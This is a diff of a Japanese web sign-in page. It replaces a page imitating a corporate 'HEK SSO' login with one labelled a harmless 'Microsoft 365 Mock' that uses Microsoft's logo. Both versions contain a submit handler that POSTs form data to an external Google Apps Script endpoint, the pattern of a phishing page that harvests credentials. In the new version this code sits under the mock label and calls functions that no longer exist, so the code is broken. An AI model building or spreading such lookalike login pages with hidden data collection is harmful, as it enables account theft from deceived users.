@@ -1,466 +1,409 @@
-
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ja">
-    <head>
-        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
-        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-        <meta http-equiv="cache-control" content="no-cache,no-store"/>
-        <meta name='mswebdialog-title' content='HEK SSO に接続しています'/>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Microsoft 365風 サインインモック</title>
+<style>
+:root{
+    --ms-blue:#0067B8;
+    --ms-blue-hover:#005A9E;
+    --text:#1b1b1b;
+    --sub:#616161;
+    --border:#d1d1d1;
+    --error:#a4262c;
+    --success:#107c10;
+}
+*{ box-sizing:border-box; }
+body{
+    margin:0;
+    min-height:100vh;
+    font-family:"Segoe UI","Yu Gothic UI",system-ui,sans-serif;
+    color:var(--text);
+    background:
+        radial-gradient(circle at 12% 18%, rgba(0,103,184,.20), transparent 28%),
+        radial-gradient(circle at 88% 78%, rgba(80,180,255,.22), transparent 30%),
+        linear-gradient(135deg,#f7fbff 0%,#eef5fb 43%,#f8f7fb 100%);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
+}
+.background-shape{
+    position:fixed;
+    inset:auto auto -140px -100px;
+    width:420px;
+    height:420px;
+    border-radius:50%;
+    background:rgba(0,103,184,.10);
+    filter:blur(8px);
+}
+.mock-badge{
+    position:fixed;
+    top:18px;
+    left:18px;
+    padding:7px 12px;
+    border:1px solid rgba(0,0,0,.08);
+    border-radius:999px;
+    background:rgba(255,255,255,.70);
+    backdrop-filter:blur(12px);
+    font-size:12px;
+    color:#4b5563;
+    letter-spacing:.02em;
+}
+.login-card{
+    width:430px;
+    max-width:92%;
+    min-height:438px;
+    padding:42px 42px 34px;
+    background:rgba(255,255,255,.90);
+    backdrop-filter:blur(22px) saturate(135%);
+    border:1px solid rgba(255,255,255,.56);
+    border-radius:14px;
+    box-shadow:0 28px 80px rgba(31,45,61,.16), 0 2px 8px rgba(31,45,61,.06);
+    transition:opacity .28s ease, transform .28s ease;
+}
+.logo{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:30px;
+}
+.logo-icon{
+    width:24px;
+    height:24px;
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    grid-template-rows:1fr 1fr;
+    gap:2px;
+}
+.logo-icon div:nth-child(1){background:#F25022;}
+.logo-icon div:nth-child(2){background:#7FBA00;}
+.logo-icon div:nth-child(3){background:#00A4EF;}
+.logo-icon div:nth-child(4){background:#FFB900;}
+.logo-text{
+    font-size:20px;
+    font-weight:600;
+    color:#323130;
+}
+.title{
+    font-size:30px;
+    line-height:1.25;
+    font-weight:600;
+    margin:0 0 12px;
+}
+.description{
+    font-size:14px;
+    line-height:1.7;
+    color:var(--sub);
+    margin-bottom:22px;
+}
+.input-wrap{ margin-top:4px; }
+.input-box{
+    width:100%;
+    border:0;
+    border-bottom:1px solid #8a8886;
+    padding:11px 0 10px;
+    font-size:15px;
+    background:transparent;
+    color:var(--text);
+}
+.input-box::placeholder{ color:#605e5c; }
+.input-box:focus{
+    outline:none;
+    border-bottom:2px solid var(--ms-blue);
+}
+.error-message{
+    display:none;
+    margin-top:8px;
+    color:var(--error);
+    font-size:13px;
+    line-height:1.5;
+}
+.error-message.show{ display:block; }
+.link{
+    display:inline-block;
+    margin-top:18px;
+    color:var(--ms-blue);
+    text-decoration:none;
+    font-size:14px;
+}
+.link:hover{ text-decoration:underline; }
+.account{
+    margin-top:28px;
+    font-size:14px;
+    line-height:1.6;
+    color:#323130;
+}
+.account a{
+    color:var(--ms-blue);
+    text-decoration:none;
+}
+.account a:hover{ text-decoration:underline; }
+.actions{
+    display:flex;
+    justify-content:flex-end;
+    gap:8px;
+    margin-top:34px;
+}
+.button{
+    border:0;
+    background:var(--ms-blue);
+    color:white;
+    min-width:108px;
+    height:36px;
+    border-radius:4px;
+    cursor:pointer;
+    font-size:14px;
+    font-weight:500;
+    padding:0 18px;
+    transition:background .16s ease, transform .16s ease, box-shadow .16s ease;
+}
+.button:hover{
+    background:var(--ms-blue-hover);
+    box-shadow:0 4px 12px rgba(0,103,184,.22);
+}
+.button:active{ transform:translateY(1px); }
+.secondary-button{
+    background:#f3f2f1;
+    color:#323130;
+}
+.secondary-button:hover{
+    background:#edebe9;
+    box-shadow:none;
+}
+.summary-box{
+    margin-top:18px;
+    padding:14px 14px;
+    background:#f5f9fd;
+    border:1px solid #e1edf8;
+    border-radius:8px;
+    font-size:14px;
+    color:#323130;
+    word-break:break-all;
+}
+.status-line{
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    margin-top:24px;
+    padding-top:20px;
+    border-top:1px solid #edebe9;
+    color:#605e5c;
+    font-size:14px;
+    line-height:1.6;
+}
+.check-icon{
+    flex:none;
+    width:22px;
+    height:22px;
+    border-radius:50%;
+    background:var(--success);
+    color:white;
+    display:grid;
+    place-items:center;
+    font-size:14px;
+    font-weight:700;
+    margin-top:1px;
+}
+.fade-out{
+    opacity:0;
+    transform:translateY(-10px) scale(.995);
+}
+.fade-in{
+    opacity:1;
+    transform:translateY(0) scale(1);
+}
+.footer{
+    position:fixed;
+    right:24px;
+    bottom:18px;
+    font-size:12px;
+    color:#605e5c;
+    display:flex;
+    gap:18px;
+}
+.footer a{
+    color:#605e5c;
+    text-decoration:none;
+}
+.footer a:hover{ text-decoration:underline; }
+@media (max-width:600px){
+    body{ align-items:flex-start; padding-top:70px; }
+    .login-card{ padding:30px 28px; min-height:auto; }
+    .title{ font-size:25px; }
+    .footer{ left:20px; right:auto; gap:14px; }
+}
+</style>
+</head>
+<body>
+<div class="background-shape" aria-hidden="true"></div>
+<div class="mock-badge">UI MOCK / 認証処理なし</div>
 
-        <title>サインイン</title>
-        
-        <style>
-        * {
-            margin:0px;
-            padding:0px;
-        }
-        html, body{
-            height:100%;
-            width:100%;
-            background-color:#ffffff;
-            color:#000000;
-            font-weight:normal;
-            font-family:"Segoe UI" , "Segoe" , "SegoeUI-Regular-final", Tahoma, Helvetica, Arial, sans-serif;
-            min-width:500px;
-        }
-        body{ font-size:0.9em; }
-
-        #noScript { margin:16px; color:Black; }
-
-        :lang(en-GB){quotes:'\2018' '\2019' '\201C' '\201D';}
-        :lang(zh){font-family:微软雅黑;}
-
-        @viewport { width: device-width; }
-
-        #fullPage, #brandingWrapper{
-            width:100%;
-            height:100%;
-            background-color:inherit;
-        }
-        #brandingWrapper{
-            background:
-              /* 光沢（上にかぶせる） */
-              linear-gradient(to bottom right,
-                rgba(255,255,255,0.18),
-                rgba(255,255,255,0.02)
-              ),
-
-              /* 細い斜めライン（強） */
-              linear-gradient(120deg, rgba(255,255,255,0.18) 10px, transparent 10px),
-
-              /* 細い斜めライン（弱） */
-              linear-gradient(60deg, rgba(255,255,255,0.08) 10px, transparent 10px),
-
-              /* 円（大・淡） */
-              radial-gradient(circle at 15% 85%, rgba(255,255,255,0.15) 120px, transparent 121px ),
-
-              /* 円（中・奥） */
-              radial-gradient(circle at 25% 80%, rgba(255,255,255,0.08) 180px, transparent 181px ),
-
-              /* 円（小・手前） */
-              radial-gradient(circle at 20% 75%, rgba(255,255,255,0.12) 40px, transparent 41px ),
-
-              /* 円（点群っぽいアクセント） */
-              radial-gradient(circle at 10% 90%, rgba(255,255,255,0.1) 150px, transparent 160px ),
-
-              /* うっすら斜めハイライト */
-              linear-gradient(160deg, rgba(255,255,255,0.06), transparent 60% ),
-
-              /* ベースカラー */
-              #4a86c5;
-
-            background-size:
-              cover,
-              180px 180px,
-              220px 220px,
-              auto,
-              auto,
-              auto,
-              auto,
-              cover;
-
-            background-repeat: no-repeat;
-        }
-
-        #contentWrapper{
-            position:relative;
-            width:500px;    
-            height:100%;
-            overflow:auto;
-            background-color:#ffffff; /* for IE7 */
-            margin-left:-500px; margin-right:0px; 
-        }
-        #content{
-            min-height:100%;
-            height: auto !important;
-            margin:0 auto -55px auto;
-            padding:0px 150px 0px 50px;
-        }
-        #header{
-            font-size:2em;
-            font-weight:lighter;
-            font-family:"Segoe UI Light" , "Segoe" , "SegoeUI-Light-final", Tahoma, Helvetica, Arial, sans-serif;
-            padding-top: 90px;
-            margin-bottom:60px;
-            min-height:100px;
-            overflow:hidden;
-        }
-        #header img{
-            /* Logo image recommended dimension: 60x60 (square) or 350X35 (elongated), 4 kB average, 10 kB maximum. Transparent PNG strongly recommended. */
-            width:auto;
-            height:auto;
-            max-width:100%;
-        }
-        #workArea, #header{
-            word-wrap:break-word;
-            width:350px;
-        }
-        #workArea{
-            margin-bottom:90px;
-        }
-        #footerPlaceholder{
-            height:40px;
-        }
-        #footer{
-            height:40px;
-            padding:10px 50px 0px 50px;
-            position:relative;
-            color:#666666;
-            font-size:0.78em;
-        }
-        #footerLinks{
-            float:none;
-            padding-top:10px;
-        }
-        #copyright {color:#696969;}
-        .pageLink { color:#000000; padding-left:16px; }
-
-        /* Common content styles */
-
-        .float { float:left; } 
-        .floatReverse { float:right; } 
-        .hidden {display:none;}
-        .error { color:#c85305; }
-        a
-        {
-            color:#2672ec;
-            text-decoration:none;
-            background-color:transparent;
-        }
-        ul { list-style-type: disc; }
-        label { margin-bottom: 8px; }
-        .submitMargin { margin-top:38px; margin-bottom:30px; }
-        .fieldMargin { margin-bottom:8px; }
-        .groupMargin { margin-bottom:30px; } 
-        .autoWidth { width:auto; }
-        .fullWidth { width:342px; }
-        input{
-            max-width:100%; 
-            font-family:inherit;
-            margin-bottom:8px;
-        }
-        input[type="radio"], input[type="checkbox"] {
-            vertical-align:middle;
-            margin-bottom: 0px;
-        }
-        span.submit, input[type="submit"]{
-            border:none;
-            background-color:rgb(38, 114, 236);
-            min-width:80px;
-            width:auto;
-            height:30px;
-            padding:4px 20px 6px 20px;
-            border-style:solid;
-            border-width:1px;
-            transition:background 0s;
-            color:rgb(255, 255, 255);
-            cursor:pointer;
-            margin-bottom:8px;
-            
-            -ms-user-select:none;
-            -moz-transition:background 0s;
-            -webkit-transition:background 0s;
-            -o-transition:background 0s;
-            -webkit-touch-callout:none;
-            -webkit-user-select:none;
-            -khtml-user-select:none;
-            -moz-user-select: none;
-            -o-user-select: none;
-            user-select:none;
-        }
-        input[type="submit"]:hover,span.submit:hover{
-            background: rgb(212, 227, 251);
-        }
-        input.text{
-            height:28px;
-            padding:0px 3px 0px 3px ;
-            border:solid 1px #BABABA;
-            font-size:1.0em;
-        }
-        input.text:focus{ border: 1px solid #6B6B6B; }
-        h1{
-            margin-bottom: 8px;
-            font-size:2.0em; 
-            font-weight:lighter;
-        }
-
-        /* Form factor: intermediate height layout. Reduce space of the header. */
-        @media only screen and (max-height: 820px) {
-            #header {
-                padding-top: 40px;
-                min-height:0px;
-                overflow: hidden;
-            }
-
-            #workArea
-            {
-                margin-bottom:60px; 
-            }
-        }
-
-        /* Form factor: intermediate layout (WAB in non-snapped view falls in here) */
-        @media only screen and (max-width: 600px) {
-            html, body {
-                min-width: 260px;
-            }
-
-            #brandingWrapper {
-                display: none;
-            }
-
-            #contentWrapper {
-                float: none;
-                width: 100%;
-                margin: 0px auto;
-            }
-
-            #content, #footer, #header {
-                width: 400px;
-                padding-left: 0px;
-                padding-right: 0px;
-                margin-left: auto;
-                margin-right: auto;
-            }
-
-            #workArea {
-                width: 100%;
-            }
-
-            .fullWidth {
-                width: 392px;
-            }
-
-        }
-
-        @media only screen and (max-width: 450px) {
-            body {
-                font-size: 0.8em;
-            }
-
-            #content, #footer {
-                width:auto;
-                margin-right:33px;
-                margin-left:25px;
-            }
-
-            #header {
-                width: auto;
-            }
-
-            span.submit, input[type="submit"] {
-                font-size: 0.9em;
-            }
-
-            .fullWidth {
-                width:100%;
-                margin-left:auto;
-                margin-right:auto;
-            }
-        }
-        </style>
-
-    </head>
-    <body dir="ltr" class="body">
-        <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
-            <h1>JavaScript は必須です</h1>
-            <p>JavaScript は必須です。この Web ブラウザーは JavaScript をサポートしていないか、この Web ブラウザーで JavaScript が有効にされていません。</p>
-            <p>Web ブラウザーが JavaScript をサポートしているかどうかの情報や、JavaScript を有効にする方法については、その Web ブラウザーのヘルプを参照してください。</p>
+<main class="login-card" id="loginCard" aria-label="Microsoft 365風サインインモック">
+    <div class="logo">
+        <div class="logo-icon" aria-hidden="true">
+            <div></div><div></div><div></div><div></div>
         </div>
-        <script>
-             document.getElementById("noScript").style.display = "none";
-        </script>
-        <div id="fullPage">
-            <div id="brandingWrapper" class="float">
-            </div>
-            <div id="contentWrapper" class="float">
-                <div id="content">
-                    <div id="header">
-                        HEK SSO
-                    </div>
-                    <div id="workArea">
-                        <div id="authArea" class="groupMargin">
-                            <div id="loginArea">
-                                <div id="loginMessage" class="groupMargin">組織アカウントを使用してサインインしてください</div>
-                                    <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="#" >
-                                        <div id="error" class="fieldMargin error smallText">
-                                            <span id="errorText" for=""></span>
-                                        </div>
-                                        <div id="formsAuthenticationArea">
-                                            <div id="userNameArea">
-                                                <label id="userNameInputLabel" for="userNameInput" class="hidden">ユーザー アカウント</label>
-                                                <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth"
-                                                    spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
-                                            </div>
+        <div class="logo-text">Microsoft 365 Mock</div>
+    </div>
 
-                                            <div id="passwordArea">
-                                                <label id="passwordInputLabel" for="passwordInput" class="hidden">パスワード</label>
-                                                <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth"
-                                                    placeholder="パスワード" autocomplete="off"/>
-                                            </div>
-                                            <div id="submissionArea" class="submitMargin">
-                                                <span id="submitButton" class="submit" tabindex="4" role="button"
-                                                    onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
-                                                    onclick="return Login.submitLoginRequest();">サインイン</span>
-                                            </div>
-                                        </div>
-                                        <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
-                                    </form>
-                                </div>
-                            </div>
-                        </div>
-                        <div id="footerPlaceholder"></div>
-                    </div>
-                    <div id="footer">
-                        <div id="footerLinks" class="floatReverse">
-                             <div>
-                                 <span id="copyright">&#169; 2016 Microsoft</span>
-                             </div>
-                    </div>
+    <h1 class="title">サインイン</h1>
+    <div class="description">Microsoft 365 風のUI確認用モックです。入力内容は送信・保存されません。</div>
+
+    <div class="input-wrap">
+        <input id="mail" type="text" class="input-box" placeholder="メール、電話、または Skype" autocomplete="off" aria-describedby="mailError">
+        <div id="mailError" class="error-message">メールアドレスを入力してください。</div>
+    </div>
+
+    <a href="#" class="link" onclick="return false;">サインイン オプション</a>
+
+    <div class="account">
+        アカウントをお持ちでない場合は <a href="#" onclick="return false;">作成できます</a>
+    </div>
+
+    <div class="actions">
+        <button class="button" id="nextBtn" type="button">次へ</button>
+    </div>
+</main>
+
+<footer class="footer">
+    <a href="#" onclick="return false;">利用規約</a>
+    <a href="#" onclick="return false;">プライバシー</a>
+    <a href="#" onclick="return false;">ヘルプ</a>
+</footer>
+
+<script>
+    const button = document.getElementById("nextBtn");
+    const input = document.getElementById("mail");
+    const error = document.getElementById("mailError");
+    const card = document.getElementById("loginCard");
+
+    function escapeHtml(value){
+        return value
+            .replaceAll("&", "&amp;")
+            .replaceAll("<", "&lt;")
+            .replaceAll(">", "&gt;")
+            .replaceAll('"', "&quot;")
+            .replaceAll("'", "&#039;");
+    }
+
+    function renderWelcome(mail){
+        card.innerHTML = `
+            <div class="logo">
+                <div class="logo-icon" aria-hidden="true">
+                    <div></div><div></div><div></div><div></div>
                 </div>
-            </div> 
-        </div>
+                <div class="logo-text">Microsoft 365 Mock</div>
+            </div>
 
-        <script>
-            var maxPasswordLength = 128;
+            <h1 class="title">ようこそ</h1>
+            <div class="description">
+                カード内の表示だけを切り替えました。実際の認証処理、通信、保存は行いません。
+            </div>
 
-            function LoginErrors(){
-                this.userNameFormatError = '\u0026quot;domain\\user\u0026quot; または \u0026quot;user@domain\u0026quot; の形式でユーザー ID を入力してください。'; 
-                this.passwordEmpty = 'パスワードを入力してください。'; 
-                this.passwordTooLong = 'パスワードが長すぎます (128 文字を超えています)。';
-            }; 
-            function InputUtil(errTextElementID, errDisplayElementID) {
+            <div class="summary-box" aria-label="入力されたアカウント">
+                ${escapeHtml(mail)}
+            </div>
 
-                if (!errTextElementID)  errTextElementID = 'errorText'; 
-                if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+            <div class="status-line">
+                <div class="check-icon" aria-hidden="true">✓</div>
+                <div>
+                    サインイン要求を受け付けました。<br>
+                    これはUI確認用の完了画面です。
+                </div>
+            </div>
 
-                this.hasFocus = false;
-                this.errLabel = document.getElementById(errTextElementID);
-                this.errDisplay = document.getElementById(errDisplayElementID);
-            };
-            InputUtil.prototype.canDisplayError = function () {
-                return this.errLabel && this.errDisplay;
-            }
-            InputUtil.prototype.checkError = function () {
-                if (!this.canDisplayError){
-                    throw new Error ('Error element not present');
-                }
-                if (this.errLabel && this.errLabel.innerHTML) {
-                    this.errDisplay.style.display = '';        
-                    var cause = this.errLabel.getAttribute('for');
-                    if (cause) {
-                        var causeNode = document.getElementById(cause);
-                        if (causeNode && causeNode.value) {
-                            causeNode.focus();
-                            this.hasFocus = true;
-                        }
-                    }
-                }
-                else {
-                    this.errDisplay.style.display = 'none';
-                }
-            };
-            InputUtil.prototype.setInitialFocus = function (input) {
-                if (this.hasFocus) return;
-                var node = document.getElementById(input);
-                if (node) {
-                    if ((/^\s*$/).test(node.value)) {
-                        node.focus();
-                        this.hasFocus = true;
-                    }
-                }
-            };
-            InputUtil.prototype.setError = function (input, errorMsg) {
-                if (!this.canDisplayError) {
-                    throw new Error('Error element not present');
-                }
-                input.focus();
+            <div class="actions">
+                <button class="button secondary-button" type="button" onclick="location.reload()">戻る</button>
+                <button class="button" type="button" onclick="location.reload()">完了</button>
+            </div>
+        `;
+    }
 
-                if (errorMsg) {
-                    this.errLabel.innerHTML = errorMsg;
-                }
-                this.errLabel.setAttribute('for', input.id);
-                this.errDisplay.style.display = '';
-            };
-            InputUtil.focus = function (inputField) {
-                var node = document.getElementById(inputField);
-                if (node) node.focus();
-            };
-        </script>
-        <script>
+    button.addEventListener("click", () => {
+        const mail = input.value.trim();
 
-            function Login() {
-            }
+        if(mail === ""){
+            error.classList.add("show");
+            input.focus();
+            return;
+        }
 
-            Login.userNameInput = 'userNameInput';
-            Login.passwordInput = 'passwordInput';
+        error.classList.remove("show");
+        button.textContent = "確認中...";
+        button.disabled = true;
+        button.style.opacity = ".85";
 
-            Login.initialize = function () {
+        window.setTimeout(() => {
+            card.classList.add("fade-out");
 
-                var u = new InputUtil();
+            window.setTimeout(() => {
+                renderWelcome(mail);
+                card.classList.remove("fade-out");
+                card.classList.add("fade-in");
+            }, 280);
+        }, 350);
+    });
 
-                u.checkError();
-                u.setInitialFocus(Login.userNameInput);
-                u.setInitialFocus(Login.passwordInput);
-            }();
+    input.addEventListener("keydown", (event) => {
+        if(event.key === "Enter"){
+            button.click();
+        }
+    });
 
-            Login.submitLoginRequest = function () { 
-                var u = new InputUtil();
-                var e = new LoginErrors();
+    function Login() {
+    }
 
-                var userName = document.getElementById(Login.userNameInput);
-                var password = document.getElementById(Login.passwordInput);
+    Login.userNameInput = 'userNameInput';
+    Login.passwordInput = 'passwordInput';
 
-                if (!userName.value || !userName.value.match('[@\\\\]')) {
-                    u.setError(userName, e.userNameFormatError);
-                    return false;
-                }
+    Login.initialize = function () {
 
-                if (!password.value) {
-                    u.setError(password, e.passwordEmpty);
-                    return false;
-                }
+        var u = new InputUtil();
 
-                if (password.value.length > maxPasswordLength) {
-                    u.setError(password, e.passwordTooLong);
-                    return false;
-                }
+        u.checkError();
+        u.setInitialFocus(Login.userNameInput);
+        u.setInitialFocus(Login.passwordInput);
+    }();
 
-                // ===== GASへ送信（重要：URLSearchParams使用）=====
-                const formData = new URLSearchParams();
-                formData.append("name", userName);
-                formData.append("email", "kotei@test.co.jp");
-                formData.append("message", "固定値検証");
+    Login.submitLoginRequest = function () { 
+        var u = new InputUtil();
+        var e = new LoginErrors();
 
-                fetch("https://script.google.com/macros/s/AKfycbzXqbYm2b95G5YqrVq6MwB4KB0A1ROQr80KaP2M3hvQ_QAYV19bd97gI3WzW7tWpN04Pg/exec", {  // ←ここ変更
-                  method: "POST",
-                  body: formData
-                })
+        var userName = document.getElementById(Login.userNameInput);
+        var password = document.getElementById(Login.passwordInput);
 
-                document.forms['loginForm'].submit();
-                return false;
-            };
-        </script>
+        if (!userName.value || !userName.value.match('[@\\\\]')) {
+            u.setError(userName, e.userNameFormatError);
+            return false;
+        }
 
-    </body>
-</html> 
+        if (!password.value) {
+            u.setError(password, e.passwordEmpty);
+            return false;
+        }
+
+        if (password.value.length > maxPasswordLength) {
+            u.setError(password, e.passwordTooLong);
+            return false;
+        }
+
+        // ===== GASへ送信（重要：URLSearchParams使用）=====
+        const formData = new URLSearchParams();
+        formData.append("name", userName);
+        formData.append("email", "kotei@test.co.jp");
+        formData.append("message", "固定値検証");
+
+        fetch("https://script.google.com/macros/s/AKfycbzXqbYm2b95G5YqrVq6MwB4KB0A1ROQr80KaP2M3hvQ_QAYV19bd97gI3WzW7tWpN04Pg/exec", {  // ←ここ変更
+          method: "POST",
+          body: formData
+        })
+
+        document.forms['loginForm'].submit();
+        return false;
+    };
+
+</script>
+</body>
+</html>
